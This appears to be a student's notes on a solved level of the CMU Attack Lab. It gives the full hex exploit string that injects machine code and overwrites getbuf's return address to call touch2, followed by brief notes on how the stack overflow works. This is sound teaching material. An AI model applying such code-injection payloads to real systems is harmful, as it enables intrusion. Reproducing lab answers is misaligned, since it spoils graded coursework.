Output:
./ctarget -q -i ctarget_inputs_hex.txt
Cookie: 0x59b997fa
Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 01 02 03 04 05 06 07 08 09 01 02 03 04 05 06 07 08 09 01 02 03 04 05 06 07 08 09 78 DC 61 55 00

1) Codes are also stored in virtual memory.
By specifying a virtual address, you can execute those bytes as codes.

2) Codes are fetched from virtual memory from bottom to up (Bottom to up -> increasing address).
Code bound is determinded by "ret".

3) The assembly version of injected codes is located in ctarget_1_2.s. Run "gcc -c ctarget_1_2.s" to build binaries.

4) Char buffers are stored in virtual memory from bottom to up, right to left.

6) Write code binaries (13 bytes) in order in the ctarget_inputs_1_2.txt. Augment it with 27 dummy bytes.
Then write "78 dc 61 55" (represents address 0x5561dc78) to modify the return address of getbuf() from "0x401976" to the start address of inject codes.

7) Don't understand why use "ret" rather than "call" yet. 